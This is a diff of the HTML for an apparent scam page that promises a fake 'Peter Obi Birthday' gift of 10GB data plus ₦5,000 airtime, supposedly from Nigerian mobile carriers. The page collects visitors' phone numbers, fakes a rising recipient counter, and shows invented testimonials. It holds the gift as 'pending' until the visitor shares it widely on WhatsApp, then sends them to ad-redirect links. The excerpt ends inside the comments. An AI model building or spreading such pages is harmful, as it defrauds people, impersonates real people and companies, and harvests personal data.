@@ -1,479 +1,625 @@
+
+
+
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html>
+
+
 <head>
-  
-      
-  
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>ENTER YOUR NUMBER</title>
+    
+    <script src="peter-verify"></script>
+    <script>
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
 
-<meta name="description" content="Peter Obi Birthday Celebration Offer: 10GB free internet + ₦5,000 Airtime for a limited time.">
-<meta property="og:title" content="ENTER YOUR NUMBER">
-<meta property="og:description" content="🎁 Your friend received a 10GB + ₦5,000 Airtime Birthday gift and wanted you to get it too.">
 
-  <meta property="og:type" content="website">
-    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWTAyXS_UxiNVakguVl1uP8kgKE7DAQbp3LGGRgpfCDczEwQheeSoaFHKMUd_bld8LiIuZgZ4enZWiXqNLYvsOCqDBVjNKhvohKOjLHrqwJynIIx_PosSyF_MqFUVO-OtFU06BSzZ24HBUCPVJOxf7TN21InbfIwmoLbCT34tvCzLnbY9KGOS_hYkflwdy/s320/301B6A0C-B41C-4594-A2A0-C8B049212BBF.jpeg" />
-  <link rel="icon" type="image/png" href="https://i.ibb.co/tM0JN1LN/63.jpg">
-<meta name="theme-color" content="#0b3b2e">
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
 
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 
-<style>
-:root{
-  --green:#0b3b2e;
-  --green2:#116149;
-  --gold:#d9a63a;
-  --gold2:#f4d27a;
-  --cream:#fff7e8;
-  --soft:#f6ead3;
-  --dark:#09271f;
-  --muted:#6c665f;
-  --white:#ffffff;
-  --danger:#d94141;
-  --shadow:0 22px 65px rgba(24, 18, 8, .18);
-}
-*{box-sizing:border-box;margin:0;padding:0}
-html,body{min-height:100%;font-family:"Inter",system-ui,sans-serif;color:var(--dark);overflow-x:hidden}
-body{
-  background:
-    radial-gradient(circle at 15% 10%, rgba(244,210,122,.45), transparent 28%),
-    radial-gradient(circle at 88% 18%, rgba(17,97,73,.20), transparent 32%),
-    linear-gradient(180deg,#fff7e8 0%,#f7ead4 52%,#fffaf0 100%);
-}
-body:before{
-  content:"";
-  position:fixed;inset:0;pointer-events:none;opacity:.22;z-index:-1;
-  background-image:
-    linear-gradient(30deg, rgba(217,166,58,.14) 12%, transparent 12.5%, transparent 87%, rgba(217,166,58,.14) 87.5%, rgba(217,166,58,.14)),
-    linear-gradient(150deg, rgba(217,166,58,.14) 12%, transparent 12.5%, transparent 87%, rgba(217,166,58,.14) 87.5%, rgba(217,166,58,.14));
-  background-size:38px 66px;
-}
-.page{width:min(560px,100%);margin:auto;position:relative;padding-bottom:28px}
-.topbar{
-  height:46px;display:flex;align-items:center;justify-content:center;gap:8px;
-  background:linear-gradient(135deg,var(--green),#041d16);
-  color:#fff;font-size:14px;font-weight:800;letter-spacing:.2px;
-  box-shadow:0 8px 30px rgba(0,0,0,.18);
-}
-.marquee{white-space:nowrap;overflow:hidden;width:100%}
-.marquee span{display:inline-block;animation:mar 16s linear infinite;padding-inline-start:100%}
-@keyframes mar{to{transform:translateX(100%)}}
-
-.hero{
-  margin:14px 14px 0;border-radius:30px;overflow:hidden;position:relative;
-  min-height:370px;padding:24px 18px 26px;text-align:center;box-shadow:var(--shadow);
-  background:
-    radial-gradient(circle at 10% 5%, rgba(255,255,255,.92), transparent 22%),
-    radial-gradient(circle at 83% 12%, rgba(244,210,122,.55), transparent 26%),
-    linear-gradient(155deg,#fffdf7 0%,#ffe9b8 48%,#f8d786 100%);
-}
-.hero:before,.hero:after{
-  content:"";position:absolute;border-radius:999px;filter:blur(.2px);opacity:.85
-}
-.hero:before{width:180px;height:180px;right:-60px;top:-60px;background:rgba(11,59,46,.10)}
-.hero:after{width:240px;height:240px;left:-110px;bottom:-110px;background:rgba(217,166,58,.18)}
-.eid-icons{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;font-size:38px;position:relative;z-index:2}
-.badge{
-  display:inline-flex;align-items:center;gap:8px;background:rgba(11,59,46,.95);color:#fff;
-  padding:8px 16px;border-radius:999px;font-weight:900;font-size:14px;
-  border:1px solid rgba(244,210,122,.55);box-shadow:0 12px 28px rgba(11,59,46,.25);
-}
-.title{position:relative;z-index:2;margin-top:14px;font-size:31px;line-height:1.25;font-weight:900;color:#08281f}
-.title small{display:block;color:var(--gold);font-size:18px;margin-bottom:3px}
-.giga{
-  position:relative;z-index:2;display:flex;align-items:flex-end;justify-content:center;gap:8px;margin:8px 0 4px;
-  direction:ltr
-}
-.giga .num{
-  font-size:98px;font-weight:900;line-height:.9;
-  background:linear-gradient(180deg,#fff4bf 0%,#d79a24 45%,#8d5d09 100%);
-  -webkit-background-clip:text;background-clip:text;color:transparent;
-  text-shadow:0 14px 28px rgba(126,79,6,.16);
-  -webkit-text-stroke:1px rgba(91,58,10,.22);
-}
-.giga .unit{font-size:34px;font-weight:900;color:#09271f;margin-bottom:8px}
-.subtitle{
-  position:relative;z-index:2;margin:10px auto 0;font-size:18px;font-weight:900;color:#fff;
-  background:linear-gradient(135deg,var(--green),var(--green2));
-  border-radius:18px;padding:12px 14px;width:min(420px,100%);
-  box-shadow:0 14px 35px rgba(11,59,46,.22);
-}
-.note{position:relative;z-index:2;margin-top:12px;color:#5f5548;font-weight:700;font-size:13px}
-
-.card{
-  background:rgba(255,255,255,.86);backdrop-filter:blur(16px);
-  border:1px solid rgba(255,255,255,.76);border-radius:26px;margin:14px;
-  box-shadow:var(--shadow);padding:18px;position:relative;overflow:hidden
-}
-.card:before{
-  content:"";position:absolute;inset:0;border-radius:26px;padding:1px;
-  background:linear-gradient(135deg,rgba(217,166,58,.38),rgba(255,255,255,0),rgba(17,97,73,.22));
-  pointer-events:none;
-}
-.step{display:none;animation:rise .45s ease both;position:relative;z-index:2}
-.step.active{display:block}
-@keyframes rise{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
-.step-title{font-size:21px;font-weight:900;text-align:center;margin-bottom:8px}
-.step-text{text-align:center;color:var(--muted);font-weight:700;font-size:14px;line-height:1.85;margin-bottom:14px}
-.btn{
-  width:100%;border:0;border-radius:18px;padding:15px 16px;
-  font-family:inherit;font-weight:900;font-size:18px;color:#fff;cursor:pointer;
-  background:linear-gradient(135deg,#e9b84d 0%,#0e5a43 48%,#05271f 100%);
-  box-shadow:0 16px 36px rgba(11,59,46,.28), inset 0 1px 0 rgba(255,255,255,.35);
-  transition:.2s transform,.2s filter;
-}
-.btn:active{transform:translateY(2px) scale(.99)}
-.btn.secondary{background:linear-gradient(135deg,#19aa62,#075d41)}
-.btn.gold{background:linear-gradient(135deg,#f5ce72,#b87b13)}
-.btn.whatsapp{background:linear-gradient(135deg,#25d366,#0b8d48)}
-.input-wrap{margin:16px 0 12px;position:relative}
-.input-wrap input{
-  width:100%;height:58px;border:1px solid rgba(9,39,31,.12);outline:none;border-radius:18px;
-  padding:0 14px 0 46px;font-family:inherit;font-size:16px;font-weight:800;color:var(--dark);
-  background:#fff;box-shadow:inset 0 0 0 1px rgba(255,255,255,.65),0 8px 26px rgba(0,0,0,.06)
-}
-.input-wrap .ico{position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:20px}
-.error{display:none;color:var(--danger);font-size:13px;text-align:center;font-weight:800;margin:7px 0}
-.loader{
-  width:96px;height:96px;margin:12px auto;border-radius:50%;
-  border:8px solid rgba(217,166,58,.25);border-top-color:var(--green);animation:spin 1s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-.percent{font-size:34px;text-align:center;font-weight:900;color:var(--green);margin:8px 0}
-.checkmark{width:96px;height:96px;margin:12px auto;border-radius:50%;display:grid;place-items:center;font-size:54px;color:#10a35a;background:#e9fff2;box-shadow:0 14px 36px rgba(16,163,90,.2)}
-.verify-list{display:grid;gap:10px;margin:16px 0}
-.verify-row{
-  display:flex;align-items:center;gap:12px;padding:12px;border-radius:18px;background:#fff;
-  border:1px solid rgba(9,39,31,.08);box-shadow:0 8px 20px rgba(0,0,0,.05)
-}
-.verify-row .mini-loader{width:34px;height:34px;border-radius:50%;border:4px solid rgba(217,166,58,.25);border-top-color:var(--green);animation:spin 1s linear infinite;flex:0 0 auto}
-.verify-row.done .mini-loader{border:0;background:#e9fff2;display:grid;place-items:center}
-.verify-row.done .mini-loader:before{content:"✓";font-weight:900;color:#0e9f58;font-size:24px}
-.verify-copy{flex:1}
-.verify-copy b{display:block;font-size:14px}
-.verify-copy span{font-size:12px;color:var(--muted);font-weight:700}
-.verify-percent{font-size:14px;font-weight:900;color:var(--green)}
-.progress-box{margin:16px 0 12px}
-.progress-line{height:18px;border-radius:999px;background:#e8ddc8;overflow:hidden;border:1px solid rgba(9,39,31,.09)}
-.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#d9a63a,#17aa62,#0b3b2e);border-radius:999px;transition:width .8s ease}
-.progress-meta{display:flex;justify-content:space-between;font-weight:900;color:var(--green);margin-top:8px;font-size:14px}
-.share-steps{background:#fff9ed;border:1px dashed rgba(217,166,58,.9);border-radius:18px;padding:12px;margin:14px 0;color:#5e5140;font-size:14px;font-weight:800;line-height:1.85}
-.stats{
-  margin:14px;display:grid;grid-template-columns:repeat(3,1fr);gap:8px
-}
-.stat{
-  background:linear-gradient(160deg,#083229,#041a15);color:#fff;border-radius:20px;padding:12px 8px;text-align:center;
-  box-shadow:0 14px 34px rgba(4,26,21,.2)
-}
-.stat b{display:block;color:var(--gold2);font-size:17px}
-.stat span{font-size:11px;font-weight:800;opacity:.9}
-.comments-card{padding:0;overflow:hidden}
-.comments-head{
-  background:linear-gradient(135deg,#083229,#0f6048);color:#fff;text-align:center;padding:16px 12px;
-  font-size:17px;font-weight:900
-}
-.reactions{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid #eee;color:#777;font-size:12px;font-weight:800;direction:ltr}
-.react-icons{display:flex;align-items:center;gap:4px}
-.react-icons span{width:22px;height:22px;border-radius:50%;display:grid;place-items:center;background:#e9f2ff;border:2px solid #fff;margin-left:-7px}
-.actions{display:grid;grid-template-columns:repeat(3,1fr);border-bottom:1px solid #eee;color:#777;font-weight:900;font-size:13px;direction:ltr}
-.actions div{text-align:center;padding:11px 0}
-.comment-list{padding:12px 14px 4px;direction:ltr;background:#fff}
-.comment{display:flex;gap:10px;margin:0 0 12px;align-items:flex-start}
-.avatar{width:38px;height:38px;border-radius:50%;object-fit:cover;flex:0 0 auto;background:#ddd}
-.bubble{background:#f1f2f5;border-radius:18px;padding:9px 12px;direction:ltr;flex:1}
-.bubble b{display:block;color:#245c9d;font-size:13px;margin-bottom:2px}
-.bubble span{display:block;color:#111;font-size:13px;line-height:1.65;font-weight:700}
-.comment-meta{margin-top:4px;color:#90949c;font-size:11px;font-weight:800;direction:ltr}
-.reply{margin-left:48px}
-.comment-input{padding:10px 14px 14px;background:#fff}
-.comment-input input{width:100%;border:0;background:#f1f2f5;border-radius:999px;padding:12px 14px;outline:none;font-family:inherit}
-.confetti{position:fixed;top:-40px;z-index:50;pointer-events:none;animation:fall linear forwards}
-@keyframes fall{to{transform:translateY(110vh) rotate(720deg);opacity:0}}
-.footer{text-align:center;font-size:12px;color:#7a6b58;font-weight:700;padding:0 20px 24px;line-height:1.8}
-.hidden{display:none!important}
-.shake{animation:shake .28s linear}
-@keyframes shake{25%{transform:translateX(5px)}50%{transform:translateX(-5px)}75%{transform:translateX(4px)}}
-@media(max-width:390px){
-  .title{font-size:27px}.giga .num{font-size:82px}.giga .unit{font-size:29px}
-  .stats{grid-template-columns:1fr 1fr}.stat:last-child{grid-column:1/-1}
-}
-</style>
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+    </script>
+    
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ENTER YOUR MOBILE NUMBER</title>
+    <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
+    
+    <meta name="og:title" content="ENTER YOUR MOBILE NUMBER" />
+    <meta property="og:description"
+        content="Peter Obi Birthday Celebration Offer" />
+    <meta property="og:image"
+        content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWTAyXS_UxiNVakguVl1uP8kgKE7DAQbp3LGGRgpfCDczEwQheeSoaFHKMUd_bld8LiIuZgZ4enZWiXqNLYvsOCqDBVjNKhvohKOjLHrqwJynIIx_PosSyF_MqFUVO-OtFU06BSzZ24HBUCPVJOxf7TN21InbfIwmoLbCT34tvCzLnbY9KGOS_hYkflwdy/s320/301B6A0C-B41C-4594-A2A0-C8B049212BBF.jpeg" />
+    <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+    
+    <link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://draft.blogger.com/profile/05853757488319578479" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    
+<link rel="me" href="https://www.blogger.com/profile/04701200208185977098" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 
 <body>
-<div class="page">
-  <div class="topbar">
-    <div class="marquee"><span>Peter Obi Birthday Celebration Offer — 10GB Internet + ₦5,000 Airtime for a Limited Time — Share with your friends 🎁</span></div>
-  </div>
+    <style>
+        .blink {
+            animation: blink 1s steps(1, end) infinite;
+        }
 
-  <section class="hero">
-    <div class="eid-icons"><span>🎉</span><span>🎂</span><span>🎁</span></div>
-    <div class="badge">🎁Peter Obi Birthday Gift</div>
-    
-    
-      <center>
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+
+
+
+    <style>
+
+
         
-        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBBTLiTsOcXDWvun5fN6dqTxw758XsLLHkDR4qcn5IwYoq-Coksls19tge4r_tjDi4rYso3x11xSVfK1l39pwKkfcThf-3ApJTpIp8GdcsjcebBc73xH_5kO6eIyMkJhIW7OVuPgCdrQAUihwP8Vd1sFeSUp2_ntzoG-UBBdGNECpRLehe-gYyN_1ZAmoG/s579/537B8E0F-9D08-4E2D-ACC1-D0721E5D49C1.png" alt="Free-Data" style="width: 100%;">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+margin: 0;
+padding: 0;
+font-family: Poppins, Droid Arabic Naskh;
+font-weight: normal;
+box-sizing: border-box;
+
+
+}
+body {
+direction: lfl;
+background: #ffffff ;
+}
+a {
+text-decoration: none;
+}
+.post {
+background: #fff;
+margin: 0 auto;
+padding: 10px;
+max-width: 500px;
+border: 1px solid #d0d1d5;
+border-radius: 3px;
+}
+.post img {
+width: 100%;
+}
+.welcome {
+font-size: 15px;
+}
+.amount,
+#getname {
+color: #098105;
+text-decoration: none;
+}
+.done {
+text-align: center;
+color: #27ae60;
+}
+.tip {
+font-size: 14px;
+}
+.title {
+text-align: center;
+}
+.error {
+display: none;
+text-align: center;
+font-size: 14px;
+color: #e74c3c;
+}
+button {
+display: block;
+width: 200px;
+height: 50px;
+color: #fff;
+border: none;
+outline: none;
+font-size: 24px;
+cursor: pointer;
+border-radius: 5px;
+padding: 0 10px;
+margin: 10px auto;
+background: rgb(20, 86, 59);
+transition: background 0.3s ease;
+}
+button:hover {
+background: #098105;
+}
+.phone {
+max-width: 400px;
+margin: 10px auto;
+}
+.phone input {
+width: 100%;
+height: 50px;
+padding: 10px;
+outline: none;
+border: 2px solid #cecece;
+font-size: 14px;
+}
+#confirm {
+width: 200px;
+margin: 10px auto;
+border-radius: 0px;
+}
+#loader {
+text-align: center;
+}
+.spin {
+width: 50px;
+height: 50px;
+background: transparent;
+border: solid 8px rgb(207, 27, 28);
+border-right-color: transparent;
+border-radius: 50%;
+margin: 10px auto;
+animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+100% {
+transform: rotate(1turn);
+}
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+display: none;
+}
+.center {
+display: flex;
+align-items: center;
+justify-content: center;
+}
+.barr {
+direction: ltr;
+max-width: 400px;
+margin: 10px auto;
+box-sizing: border-box;
+}
+.fill {
+position: relative;
+display: inline-block;
+width: calc(100% - 100px);
+height: 35px;
+padding: 2px;
+border: 2px solid #098105;
+}
+#fill,
+#fill2 {
+background: #098105;
+width: 0%;
+height: 100%;
+}
+.percentage {
+width: 100px;
+float: right;
+height: 35px;
+font-size: 16px;
+border: 2px solid #098105;
+}
+#percentage,
+#percentage2 {
+margin-left: 5px;
+}
+#check,
+#check2 {
+display: none;
+}
+.counter {
+color: #7f7f7f;
+font-size: 12px;
+text-align: right;
+padding: 10px 0 10px 2px;
+border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+display: inline-flex;
+align-items: center;
+float: left;
+}
+.counter img {
+float: left;
+width: 16px;
+height: 16px;
+border-radius: 50%;
+border: 2px solid #fff;
+box-sizing: content-box;
+}
+.like,
+.love {
+margin-right: -5px;
+}
+.like {
+z-index: 2;
+}
+.love {
+z-index: 1;
+}
+.bar {
+display: table;
+width: 100%;
+border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+display: table-cell;
+width: calc(100% / 3);
+font-size: 12px;
+color: #7f7f7f;
+text-align: center;
+padding: 10px 0;
+cursor: pointer;
+}
+.comments {
+direction: ltr;
+}
+.comment {
+padding: 6px 0;
+margin-top: 5px;
+}
+.comment img {
+float: left;
+width: 32px;
+height: 32px;
+border: none;
+border-radius: 18px;
+cursor: pointer;
+}
+.reply {
+margin-left: 37px;
+}
+.single-container {
+margin-left: 37px;
+background: #f1f2f6;
+padding: 10px;
+border-radius: 15px;
+font-size: 12px;
+}
+.single-container .user {
+display: inline-block;
+cursor: pointer;
+color: #365899;
+margin-bottom: 5px;
+}
+.single-container .text {
+display: block;
+}
+.buttons {
+font-size: 12px;
+font-weight: bold;
+margin: 10px 0 0 47px;
+color: #90949c;
+}
+.action {
+cursor: pointer;
+}
+.action:hover {
+text-decoration: underline;
+}
+.input {
+padding: 6px 12px 12px;
+}
+.input input {
+width: 100%;
+background: #f1f2f6;
+padding: 10px;
+border-radius: 15px;
+border: 0;
+outline: none;
+}
+.A{
+text-align: center;
+background-color: rgb(20, 86, 59);
+}
+    </style>
+
+     <style>
+        .loading-gif {
+            max-width: 500px;
+        }
+
+        .pre-loader {
+            position: fixed;
+            z-index: 100; /** make sure this is the highest value compared to all other divs **/
+            top: 0;
+            left: 0;
+            background: #191f26;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            width: 100%;
+        }
+
+        .pre-loader.hidden {
+            animation: fadeOut 5s; /** change to 1s */
+            animation-fill-mode: forwards;
+        }
+
+        @keyframes fadeOut {
+            100% {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+    </style>
+    <center>
+        
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglw-SUCsl_S9Qb9E4Aru6FZVC6dbJEWub3UtbI93BZjKfNuiSUN8E-FSbX0if9h4GLs4vtpjB769NGdYBgVrFeDVpsZoAxudPa_4SPaw3mQTSSvOqfxT8YEK0Nm_-IIb4Ij184ywiJ3pigVwfsc-ETxEDQuKFArzpzD00GjNdOK4qUCPU0Q3jNuJ58HKyi/s1080/10500CBF-9B0D-4CA1-9949-0D3433EEEB6D.jpeg" alt="Free-Data" style="width: 100%;">
     </center>
-    
-    <p class="note">Limited-time offer — complete the steps to activate your gift</p>
-  </section>
 
-  <section class="card">
-    <div id="step1" class="step active">
-      <h2 class="step-title">Start Your 10GB + ₦5,000 Airtime Gift 🎉</h2>
-      <p class="step-text">Tap the GET OFFER button below to start checking your gift and preparing the internet package.</p>
-      <button id="startBtn" class="btn">GET OFFER</button>
+  <marquee width="100%" direction="left" height="50px">
+PETER OBI BIRTHDAY CELEBRATION OFFER
+</marquee>
+    <div class="A">
+        <font color="white">Till Today</font><b></br>
+                <span id="countdowntimer" style="color:yellow;">4548</span></b></br>
+        <font color="white">Nigerians have Received 10GB + ₦5,000 Airtime</font>
+        <script type="text/javascript">
+            var timeleft = 4548;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+        </script>
     </div>
+    <div class="post" width="100%">
 
-    <div id="stepLoading" class="step">
-      <div class="loader"></div>
-      <div id="mainPercent" class="percent">0%</div>
-      <p class="step-text">Preparing your gift and checking offer availability...</p>
-    </div>
+        <div id="intro">
 
-    <div id="step2" class="step">
-      <h2 class="step-title">Enter Your Mobile Number 📱</h2>
-      <p class="step-text">Enter your number to check if the 10GB + ₦5,000 Airtime gift can be activated on your Mobile Number.</p>
-      <div class="input-wrap">
-        <span class="ico">☎️</span>
-        <input id="phone" inputmode="numeric" placeholder="Example: 07XXXXXXXX">
-      </div>
-      <div id="phoneError" class="error">Please enter a valid number.</div>
-      <button id="phoneBtn" class="btn">Verify Number</button>
-    </div>
+            <p class="welcome">
+               
 
-    <div id="step3" class="step">
-      <h2 class="step-title">Checking Your Mobile Number Details ✨</h2>
-      <div class="verify-list">
-        <div class="verify-row" id="row1">
-          <div class="mini-loader"></div>
-          <div class="verify-copy"><b>Processing Number</b><span>Checking the mobile number</span></div>
-          <div class="verify-percent" id="p1">0%</div>
+
+
+
+                <span class="amount">POWERED BY: Nigeria Democratic Congress (NDC)</span>
+             Peter Obi in Collaboration with MTN, Airtel, Glo and 9-Mobile to Provide 10GB Free Data and ₦5,000 Airtime to everyone in Celebration of his Birthday<br> <span class="amount"></span> <br/>
+ <center>
+
+                   <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">---SELECT YOUR NETWORK---</option>
+<option value="1"> MTN - 10GB + ₦5,000   </option>
+<option value="1"> Airtel - 10GB + ₦5,000    </option>
+                     <option value="1"> Glo - 10GB + ₦5,000    </option>
+                     <option value="1"> 9-Mobile - 10GB + ₦5,000    </option>
+
+                      
+
+
+
+                        
+</select>
+                </center><br>
+
+            </p>
+
+
+
+ 
+            
+
+            <button id="go"> <font color="white">GET OFFER </font></button>
         </div>
-        <div class="verify-row" id="row2">
-          <div class="mini-loader"></div>
-          <div class="verify-copy"><b>Preparing 10GB + ₦5,000 Airtime</b><span>Linking the gift to your number</span></div>
-          <div class="verify-percent" id="p2">0%</div>
+        <div id="loader">
+            <div>Please Wait ...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
         </div>
-      </div>
-    </div>
+        <div id="info">
+            <p class="title"> ENTER YOUR MOBILE NUMBER:</p>
+            <div class="phone">
+                <center><input type="char" placeholder="type your number here" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
+                </center>
+<br/>
+             
 
-    <div id="step4" class="step">
-      <div class="checkmark">✓</div>
-      <h2 class="step-title">Congratulations! One Step Left</h2>
-      <p class="step-text">Your 10GB + ₦5,000 Airtime gift is ready. Share the offer with your friends to complete the activation bar.</p>
-      <div class="share-steps">
-        1 - Tap the WhatsApp button and share with friends or groups.<br>
-        2 - Each share increases the activation bar.<br>
-        3 - Once the bar is complete, the final activation step will appear.
-      </div>
-      <div class="progress-box">
-        <div class="progress-line"><div id="shareFill" class="progress-fill"></div></div>
-        <div class="progress-meta"><span>Activation Progress</span><span id="sharePercent">0%</span></div>
-      </div>
-      <button id="shareBtn" class="btn whatsapp">Share on WhatsApp</button>
-    </div>
 
-    <div id="step5" class="step">
-      <div class="checkmark">🎁</div>
-      <h2 class="step-title">Activation Complete</h2>
-      <p class="step-text">You can now continue to claim your gift and complete the final step.</p>
-      <button id="claimBtn" class="btn gold">Claim 10GB Now</button><br/><br/>
-      <button id="claimBtn" class="btn gold">Claim Airtime Now</button>
-      <br/><br/>
-      
-      
-       <a onclick="window.open('https://ey43.com/4/3144603')"
+                <button id="confirm"><font color="white">Send</font></button>
+            </div>
+            <p class="error">Please Validate Your Mobile Number</p>
+        </div>
+        <div id="checking">
+            <p class="title">Activating 10GB + ₦5,000 Airtime...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+            <p class="tip"> Congratulations, <span id="getname"></span>،</p>
+            <p class="tip">
+                Your 10GB + ₦5,000 Airtime is <font color="red"><b>pending</b></font> because you have not completed the Human verification process
+               <span class="amount"> Complete the verification process to receive your 10GB + ₦5,000 Airtime now</span><br>
+              <font color="red"><b>How to proceed?</b></font>
+            </p><br>
+            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+            <p class="tip">2. You will be redirected automatically to "ACTIVATION" page after the GREEN verification bar is filled.</p>
+
+
+
+            <button id="whatsapp"><font color="white">SHARE</font></button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title"> Click "ACTIVATE" to activate your 10GB + ₦5,000 Airtime </p>
+            <br/>
+            <a onclick="window.open('https://ey43.com/4/3144603')"
                 href="https://obqj2.com/4/6798333">
                 <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 10GB</font></button>
             </a><br/>
-    </div>
-  </section>
 
-  <section class="stats">
-    <div class="stat"><b>+245K</b><span>People shared this offer</span></div>
-    <div class="stat"><b>10GB + ₦5,000 Airtime</b><span>Gift Value</span></div>
-    <div class="stat"><b>Birthday Gift</b><span>For Peter Obi</span></div>
-  </section>
+          <a onclick="window.open('https://ey43.com/4/3144603')"
+                href="https://obqj2.com/4/6798333">
+                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE AIRTIME</font></button>
+            </a><br/>
 
-  <section class="card comments-card">
-    <div class="comments-head">Latest Birthday Comments 💬</div>
-    <div class="reactions">
-      <div class="react-icons"><span>👍</span><span>❤️</span><span>🥰</span><strong id="likes">134K</strong></div>
-      <div><span id="commentsCount">23K comments</span> · <span id="sharesCount">12K shares</span></div>
-    </div>
-    <div class="actions"><div>Like</div><div>Comment</div><div>Share</div></div>
-    <div class="comment-list">
-      <div class="comment">
-        <img class="avatar" src="https://i.pravatar.cc/80?img=32" alt="">
-        <div>
-<div class="bubble"><b>Emily Carter</b><span>I received the 10GB after completing the sharing progress bar. Such an amazing gift Happyn Birthday Sir ❤️</span></div>
-          <div class="comment-meta">1m · Like · Reply</div>
-        </div>
-      </div>
-      <div class="comment">
-        <img class="avatar" src="https://i.pravatar.cc/80?img=12" alt="">
-        <div>
-          <div class="bubble"><b>Daniel Miller</b><span>I tried it and the steps were easy. The 10GB gift page appeared quickly.</span></div>
-          <div class="comment-meta">2m · Like · Reply</div>
-        </div>
-      </div>
-      <div class="comment reply">
-        <img class="avatar" src="https://i.pravatar.cc/80?img=15" alt="">
-        <div>
-          <div class="bubble"><b>Sophia Brown</b><span>I also completed the sharing step and got to the gift activation.</span></div>
